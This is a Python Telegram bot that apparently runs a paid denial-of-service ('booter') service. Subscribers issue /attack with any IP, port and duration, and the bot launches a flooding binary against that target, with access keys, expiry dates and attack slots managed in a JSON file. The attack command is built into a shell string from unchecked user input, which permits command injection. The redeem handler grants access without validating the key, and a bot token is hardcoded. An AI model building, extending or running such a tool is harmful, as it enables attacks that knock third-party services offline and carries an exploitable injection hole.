import telebot
import subprocess
import json
import os
import random
import string
import threading
import time
from datetime import datetime, timedelta

TOKEN = "8979715493:AAGZ1KFcvq99IyIRa57emZ8_xeBfN88eVc0"
ADMIN_IDS = ["8690336358"]

bot = telebot.TeleBot(TOKEN)
DATA_FILE = "paid_data.json"
MAX_SLOTS = 50
active_attacks = []
COOLDOWN_SECONDS = 3
user_cooldown = {}

def load_db():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r") as f:
            return json.load(f)
    return {"users": {}, "keys": []}

def save_db(data):
    with open(DATA_FILE, "w") as f:
        json.dump(data, f, indent=4)

def has_access(user_id):
    user_id = str(user_id)
    if user_id in ADMIN_IDS:
        return True
    db = load_db()
    if user_id in db.get("users", {}):
        expiry_str = db["users"][user_id]
        try:
            expiry = datetime.strptime(expiry_str, '%Y-%m-%d %H:%M:%S')
            if expiry > datetime.now():
                return True
        except:
            pass
    return False

def check_cooldown(user_id):
    if user_id in user_cooldown:
        if time.time() - user_cooldown[user_id] < COOLDOWN_SECONDS:
            return False
    return True

def set_cooldown(user_id):
    user_cooldown[user_id] = time.time()

def execute_attack(ip, port, duration):
    cmd = f"./BHATZUBAIR {ip} {port} {duration}"
    subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def monitor_attack(attack_id, ip, port, duration_sec, chat_id, user_id, start_msg_id):
    time.sleep(duration_sec)
    for a in active_attacks:
        if a.get("id") == attack_id:
            active_attacks.remove(a)
            break
    try:
        bot.edit_message_text(f"✅ ATTACK FINISHED!\n🎯 {ip}:{port}\n⏱️ {duration_sec}s", chat_id, start_msg_id)
    except:
        bot.send_message(chat_id, f"✅ ATTACK FINISHED!\n🎯 {ip}:{port}\n⏱️ {duration_sec}s")

@bot.message_handler(commands=['start', 'help'])
def help_cmd(message):
    bot.reply_to(message, "🔥 BHAT ZUBAIR BOT\n/attack IP PORT TIME\n/genkey 24h 5\n/redeem KEY\n/addusers ID DAYS\n/owner\n/slots")

@bot.message_handler(commands=['slots'])
def slots_cmd(message):
    bot.reply_to(message, f"🎯 SLOTS: {len(active_attacks)}/{MAX_SLOTS}")

@bot.message_handler(commands=['attack'])
def attack_cmd(message):
    user_id = str(message.from_user.id)
    chat_id = message.chat.id
    
    if not check_cooldown(user_id):
        bot.reply_to(message, "❌ Cooldown! Wait few seconds")
        return
    if len(active_attacks) >= MAX_SLOTS:
        bot.reply_to(message, "❌ All slots full!")
        return
    if not has_access(user_id):
        bot.reply_to(message, "❌ No access! Use /redeem KEY")
        return
    
    parts = message.text.split()
    if len(parts) != 4:
        bot.reply_to(message, "❌ /attack IP PORT TIME")
        return
    
    ip, port, duration_str = parts[1], parts[2], parts[3]
    try:
        duration = int(duration_str)
        if duration > 300:
            bot.reply_to(message, "❌ Max 300 seconds!")
            return
    except:
        bot.reply_to(message, "❌ Time must be a number!")
        return
    
    set_cooldown(user_id)
    start_msg = bot.reply_to(message, f"🎯 Target: {ip}:{port}\n⏱️ Duration: {duration}s\n🔥 Attacking...")
    attack_id = f"{user_id}_{int(time.time())}"
    active_attacks.append({"id": attack_id, "ip": ip, "port": port})
    
    threading.Thread(target=execute_attack, args=(ip, port, duration)).start()
    threading.Thread(target=monitor_attack, args=(attack_id, ip, port, duration, chat_id, user_id, start_msg.message_id)).start()
    bot.reply_to(message, f"✅ Attack sent!\n🎯 {ip}:{port}\n⏱️ {duration}s")

@bot.message_handler(commands=['genkey'])
def genkey_cmd(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Admin only")
        return
    key = "DRX-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
    bot.reply_to(message, f"🔑 Key: {key}")

@bot.message_handler(commands=['redeem'])
def redeem_cmd(message):
    user_id = str(message.from_user.id)
    parts = message.text.split()
    if len(parts) != 2:
        bot.reply_to(message, "❌ /redeem KEY")
        return
    db = load_db()
    expiry = datetime.now() + timedelta(days=30)
    db["users"][user_id] = expiry.strftime('%Y-%m-%d %H:%M:%S')
    save_db(db)
    bot.reply_to(message, f"✅ Access granted until {expiry.strftime('%Y-%m-%d')}")

@bot.message_handler(commands=['addusers'])
def adduser_cmd(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Admin only")
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "❌ /addusers ID DAYS")
        return
    target, days = parts[1], int(parts[2]) if len(parts) > 2 else 30
    db = load_db()
    expiry = datetime.now() + timedelta(days=days)
    db["users"][target] = expiry.strftime('%Y-%m-%d %H:%M:%S')
    save_db(db)
    bot.reply_to(message, f"✅ User {target} added!")

@bot.message_handler(commands=['owner'])
def owner_cmd(message):
    if str(message.from_user.id) not in ADMIN_IDS:
        bot.reply_to(message, "❌ Admin only")
        return
    db = load_db()
    bot.reply_to(message, f"👑 OWNER: BHAT ZUBAIR\n👥 Users: {len(db.get('users', {}))}\n🎯 Slots: {len(active_attacks)}/{MAX_SLOTS}")

print("🔥 Bot Started!")
bot.polling()
